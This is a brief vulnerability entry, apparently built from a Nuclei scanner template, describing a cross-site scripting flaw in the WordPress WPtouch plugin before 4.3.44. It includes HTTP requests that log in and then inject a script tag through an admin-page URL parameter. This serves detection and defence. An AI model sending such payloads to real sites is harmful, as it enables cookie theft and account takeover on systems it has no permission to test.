# Vulnerability: WordPress WPtouch <4.3.44 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wptouch-xss.yaml`)

## Description
WordPress WPtouch plugin prior to 4.3.44 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=wptouch-admin-license&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

